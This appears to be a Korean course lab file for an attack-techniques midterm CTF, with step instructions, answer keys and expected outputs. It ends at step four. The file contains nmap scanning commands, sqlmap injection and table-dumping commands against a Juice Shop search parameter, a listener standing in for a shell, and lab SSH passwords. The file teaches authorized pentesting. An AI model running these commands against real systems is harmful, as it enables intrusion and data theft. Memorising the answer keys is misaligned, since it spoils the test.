lab_id: standalone-attack-week08
title: "중간고사 CTF — 익스플로잇 체인으로 플래그(셸) 캡처"
version: standalone-attack
course: attack
week: 8
description: |
  공격기법 W08 중간고사 CTF. W01–W07 에서 하나씩 익힌 개별 공격 기법(정찰·API/JWT·SQLi·XSS·
  접근제어·SSRF/업로드)을 하나의 익스플로잇 체인으로 엮는다. 공격자(레드팀) 시선으로
  정찰(nmap) → 웹 익스플로잇(SQLi 침투) → 셸 캡처(코드 실행 거점 = 리스너 포트 48008 = 플래그)의
  4 단계를 수행하고, 그다음 방어자 시선으로 돌아서서 흩어진 흔적(WAF 913/942 + IDS + 호스트 포트)을
  출처 IP(192.168.0.202)로 한 체인으로 역재구성한다. 정찰을 잡는 IDS 탐지 룰(sid 9408001)을 직접
  작성·reload·트리거·검증 후 sid 로 삭제한다.
  CTF 의 플래그는 "코드 실행을 증명하는 것" — 본 시험은 리스너 포트 48008 캡처를 플래그로 한다.
  셸(리스너)·IDS 룰은 캡처·검증 직후 self-clean(공유 인프라 보존). 인가된 실습 환경(el34)에서만.
  공격은 외부 공격자 VM 192.168.0.202(att/1)에서 공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로
  접속해 수행하고, 방어 로그 확인은 방어 장비(`ssh ccc@10.20.31.2` IPS / `ssh ccc@10.20.32.80` WAF, 비번 1)에서 한다.
  합격 임계값 0.7.
difficulty: hard
duration_minutes: 220
prerequisites:
  - "W01–W07 통과 (정찰·API/JWT·SQLi·XSS·접근제어·SSRF/업로드)"
  - "공격 VM ssh att@192.168.0.202 + 표적/방어 장비 ssh ccc@10.20.32.80·10.20.31.2 (비번 1)"
  - "lecture §1(왜 단일 취약점이 아니라 체인인가) §2(체인 4 단계) §3(진입 경로·플래그 정의) 숙지"
objectives:
  - "W01–W07 개별 기법을 정찰→침투→셸의 익스플로잇 체인으로 통합 구성"
  - "CTF 플래그(코드 실행 거점 = 셸 리스너 포트 48008) 캡처·확인"
  - "방어자 관점으로 WAF/IDS/호스트 흔적을 출처 IP 로 한 체인으로 역재구성"
  - "정찰 탐지 IDS 룰(sid 9408001) 작성→reload→트리거→검증→삭제(베이스 보존)"
  - "셸/룰 self-clean 으로 공유 인프라 보존, 증거 기반 CTF 보고서 작성"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      익스플로잇 체인을 시작하기 전, 공격 도구가 갖춰져 있고 대상에 도달 가능한지 점검한다.

      ## 📖 개념 한 줄
      침투 테스트는 RoE(교전 규칙) 확인 직후 항상 **도구 가용성 + 대상 도달성**부터 점검한다.
      도구가 없거나 대상이 무응답이면 체인을 시작할 수 없기 때문이다(lecture §7 미션 1).

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 정찰 도구 nmap 설치 경로 확인
      command -v nmap
      # 2) SQLi 자동화 도구 sqlmap 설치 경로 확인
      command -v sqlmap
      # 3) 대상 vhost(dvwa) 도달성 + 지문 — whatweb(정찰 도구)로 상태코드·서버·타이틀 확인
      whatweb -a1 http://dvwa.el34.lab/
      ```
      > 💡 대상 도달은 브라우저로 `http://dvwa.el34.lab/` 를 열어도 확인된다 — 여기선 whatweb 으로
      > 상태코드 + 서버(Apache) + WAF 흔적을 한 번에 지문한다(nc 로 코드만 보는 것보다 정찰 정보가 많다).
      - nmap(포트·서비스 스캐너, W01), sqlmap(SQLi 자동화, W04, 여기선 존재만 확인), whatweb(웹 지문 정찰) — 자연 URL `http://dvwa.el34.lab/`(호스트명이 vhost 지정).

      ## ✅ 합격 기준
      `nmap` 출력 시 통과. **근거:** nmap/sqlmap 경로가 보이고 dvwa 가 HTTP 코드로 응답하면 체인 시작
      준비 완료다.
    hint: 'nmap/sqlmap + 대상'
    category: survey
    points: 8
    answer: |
      # 1) 정찰 도구 nmap 설치 경로 확인
      ssh att@192.168.0.202 'command -v nmap'
      # 2) SQLi 자동화 도구 sqlmap 설치 경로 확인
      ssh att@192.168.0.202 'command -v sqlmap'
      # 3) 대상 vhost(dvwa) 도달성 + 지문 — whatweb 정찰
      ssh att@192.168.0.202 'whatweb -a1 http://dvwa.el34.lab/'
    answer_detail: "CTF 착수 점검 — 공격 도구(nmap 정찰 / sqlmap SQLi)와 대상(dvwa vhost) 도달성을 확인. nmap 경로가 출력되면 도구 준비 완료로 판정. 도달성은 whatweb 으로 상태코드+서버+WAF 흔적까지 지문한다. 도구·대상이 갖춰져야 정찰→침투→셸의 익스플로잇 체인을 시작할 수 있다."
    expected_output: |
      /usr/bin/nmap
      /usr/bin/sqlmap
      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161]
    verify:
      type: output_contains
      expect: 'nmap'
      field: stdout
      semantic:
        intent: "도구/대상 점검"
        success_criteria: ["도구 + 대상"]
        acceptable_methods: ["**[OSS] 점검 (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표 — 익스플로잇 체인 ① 정찰: 공격 표면 식별
      nmap 으로 대상의 열린 포트를 매핑해 "어디로 들어갈 수 있는가"를 그린다.

      ## 📖 개념 한 줄
      **정찰(Recon)** 은 익스플로잇 체인의 첫 단계(PTES 1단계)다. 열린 포트·웹 vhost 가 곧 다음 단계의
      **익스플로잇 후보**가 된다(lecture §2.1). 입구를 모르면 침투할 수 없다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) ① 정찰 — fw DNAT 공개 포트 스캔(open/PORT 줄만), 익스플로잇 후보 표면 매핑
      nmap -p 80,443,8001-8007 192.168.0.161 -T4 --max-retries 1 2>/dev/null | grep -E "open|PORT"
      ```
      - `-T4`(빠른 타이밍, 빠를수록 IDS에 더 잘 잡힘=은밀성↔속도 trade-off), `-p`(스캔 포트, el34 fw DNAT 공개 포트). ⚠️ 정찰은 가장 시끄러운 단계 — 이 스캔 자체가 Suricata 에 흔적.

      ## ✅ 합격 기준
      `open` 출력 시 통과. **근거:** 열린 포트(open)가 식별되면 공격 표면 매핑 성공 — 이 포트·vhost 가
      다음 침투 단계의 익스플로잇 후보다.
    hint: 'nmap 포트'
    category: recon
    points: 10
    answer: |
      # 1) ① 정찰 — fw DNAT 공개 포트 스캔(open/PORT 줄만), 익스플로잇 후보 표면 매핑
      ssh att@192.168.0.202 'nmap -p 80,443,8001-8007 192.168.0.161 -T4 --max-retries 1 2>/dev/null | grep -E "open|PORT"'
    answer_detail: "익스플로잇 체인 1단계(정찰, PTES 1단계) — nmap 으로 대상 표면(열린 포트·서비스)을 매핑. open 포트가 출력되면 성공. 열린 포트·웹 vhost 가 다음 침투 단계의 익스플로잇 후보다. 빠른 스캔(-T4)은 그만큼 IDS 에 시끄럽게 잡힌다."
    expected_output: |
      PORT     STATE SERVICE
      80/tcp   open  http
      443/tcp  open  https
      8001/tcp open  vcom-tunnel
      8002/tcp open  teradataordbms
      8003/tcp open  mcreport
      8004/tcp open  p2pevolvenet
      8005/tcp open  mxi
      8006/tcp open  wpl-analytics
      8007/tcp open  ajp12
    verify:
      type: output_contains
      expect: 'open'
      field: stdout
      semantic:
        intent: "정찰 표면 식별"
        success_criteria: ["열린 포트"]
        acceptable_methods: ["**[OSS] nmap (권장)**"]
    target_vm: ips

  - order: 3
    instruction: |
      ## 🎯 목표 — 익스플로잇 체인 ② 웹 익스플로잇: 진짜 sqlmap 으로 SQLi 침투 + DB 탈취
      정찰로 dvwa 는 WAF 차단(step 5 에서 IDS 로 확인)임을 알았으니, **차단 안 되는 경로(juice, 탐지전용)**로
      방향을 틀어 실제 SQL Injection 으로 웹앱 DB 를 탈취한다.

      ## 📖 개념 한 줄
      **웹 익스플로잇(Exploit)** 은 익스플로잇 체인의 침투 단계(PTES 4단계)다. 위조 UA 를 단 curl 한 발이
      아니라 **진짜 sqlmap** 으로 파라미터를 자동 주입한다 — sqlmap 이 스스로 payload 를 변형하며 주입점을
      찾고(boolean/time-based blind), 확인되면 DB 를 열거·탈취한다(lecture §2.2, W04 복습). dvwa 는 차단
      모드라 sqlmap 이 "WAF/IPS 검출 → not injectable → --tamper 권유"로 막히지만, juice(탐지전용)의 검색
      파라미터 `q` 는 통과되어 **실제 주입이 성립**한다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) ② 웹 익스플로잇 — 진짜 sqlmap 으로 juice 검색(q) 자동 SQLi 침투(탐지전용이라 통과 → 실제 주입 성립)
      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring
      # 2) 주입 확인되면 DB 테이블 열거 = 실제 데이터 유출(Users/Products/…)
      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --tables --disable-coloring
      ```
      1) 은 `GET parameter 'q' is vulnerable`(SQLite, boolean/time-based blind)까지 확인한다. 2) 는 그 주입점을
      재사용해 `SQLite_masterdb` 의 테이블(Users/Products/Captchas/Feedbacks/…)을 뽑아낸다 = 침투 성공.
      > 💡 **화면으로 확인:** 브라우저에서 `http://juice.el34.lab/rest/products/search?q=apple'` 처럼 따옴표를
      > 붙이면 SQL 오류로 응답이 달라진다(수동 주입 감각). 반복·자동화는 sqlmap 이 담당한다.
      - dvwa 로 같은 sqlmap 을 돌리면 WAF 가 막아 `not injectable`(차단=탐지) → 그래서 juice 로 방향을 튼다.

      ## ✅ 합격 기준
      `vulnerable` 또는 테이블명(`Users`) 출력 시 통과. **근거:** 진짜 sqlmap 이 juice 의 `q` 를 주입 가능으로
      판정하고 테이블을 열거하면 실제 침투 성공 = 익스플로잇 체인 침투 단계 완성.
    hint: 'sqlmap 으로 juice ?q SQLi → --tables 로 DB 탈취'
    category: manipulation
    points: 12
    answer: |
      # 1) 진짜 sqlmap 으로 juice 검색(q) 자동 SQLi 침투(< /dev/null 로 비대화 고정)
      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring < /dev/null 2>&1 | grep -iE "is vulnerable|Type:|back-end DBMS|Parameter:" | head'
      # 2) 주입점 재사용해 DB 테이블 열거 = 실제 데이터 유출
      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --tables --disable-coloring < /dev/null 2>&1 | grep -iE "Database:|Users|Products|Feedbacks|Captchas" | head'
    answer_detail: "익스플로잇 체인 2단계(침투, PTES 4단계) — 위조 UA curl 이 아니라 진짜 sqlmap 으로 자동 SQLi. dvwa 는 WAF 차단(not injectable)이라 차단 안 되는 juice(탐지전용)의 검색 파라미터 q 로 전환하면 SQLite boolean/time-based blind 주입이 성립하고, --tables 로 SQLite_masterdb 의 실제 테이블(Users/Products/…)을 탈취한다. 실전 CTF 의 '차단 신호 읽고 우회 경로로 전환'을 그대로 재현. vulnerable/Users 가 보이면 침투 성공."
    expected_output: |
      GET parameter 'q' is vulnerable.
      Type: boolean-based blind
      Database: SQLite_masterdb
      | Users |
      | Products |
    verify:
      type: output_contains
      expect: 'vulnerable'
      field: stdout
      semantic:
        intent: "진짜 sqlmap 으로 실제 SQLi 침투 + DB 탈취"
        success_criteria: ["sqlmap 주입 성공(vulnerable)", "테이블 열거(Users/Products)"]
        acceptable_methods: ["**[OSS] sqlmap 자동 SQLi + --tables (권장)**", "**[OSS] 차단 dvwa→탐지전용 juice 전환**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표 — 익스플로잇 체인 ③ 셸 캡처(플래그): 포트 48008
      코드 실행 거점(셸)을 확보해 **플래그**를 캡처한다. 본 시험의 플래그 = 리스너 포트 48008.

      ## 📖 개념 한 줄
      CTF 의 **플래그는 "코드 실행을 증명하는 것"** 이다(lecture §2.3, §3.3). 침투로 확보한 코드 실행
      능력을, 표적 호스트(web)에 **비표준 포트 48008 리스너**를 띄우는 것으로 모사·증명한다. 리스너가
      떠 있음은 임의 프로세스를 실행할 수 있었다는 뜻 = 셸(코드 실행 거점) 확보.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **셸 캡처(표적 호스트 web):** 익스플로잇으로 확보한 코드 실행 거점 — `ssh ccc@10.20.32.80`(비번 `1`)로 표적 web 에서 실행한다.

      ```bash
      # 1) ③ 셸 캡처 — 표적 호스트(web)에 비표준 포트 48008 리스너 기동(코드 실행 거점 모사)
      nohup python3 -m http.server 48008 >/dev/null 2>&1 &
      # 2) 리스너가 뜰 때까지 대기 — 고정 sleep 이 아니라 포트가 열리면 즉시 진행(조건 폴링, 최대 5초)
      timeout 5 bash -c 'until ss -tlnp | grep -q :48008; do :; done'
      # 3) 포트 48008을 듣는 프로세스(pid) 확인 = 플래그(셸) 캡처 입증
      ss -tlnp | grep ':48008'
      # 4) self-clean — 리스너 즉시 종료([h]ttp 자기매치 방지)
      pkill -f "[h]ttp.server 48008"
      ```
      `ss -tlnp` 출력에 포트 48008 과 주인 프로세스(pid)가 보이면 임의 프로세스를 띄울 수 있었다는 뜻 =
      셸(코드 실행 거점) 확보 = 플래그 캡처. 공유 인프라라 확인 직후 pkill 로 리스너를 정리한다.
      - `nohup ... &`(백그라운드 분리), `until ss ... grep -q :48008`(포트가 열릴 때까지 조건 폴링 — 고정 대기 대신 실제 상태를 본다), `[h]ttp` 대괄호(pkill 자기매치 방지). ⚠️ 공유 인프라라 확인 직후 self-clean.

      ## ✅ 합격 기준
      `48008` 출력 시 통과. **근거:** osquery 결과에 포트 48008 과 주인 프로세스(pid)가 보이면 플래그(셸)
      캡처 = 익스플로잇 체인 완성 — 확인 직후 pkill 로 리스너를 정리한다(self-clean).
    hint: '리스너 48008 = 플래그'
    category: manipulation
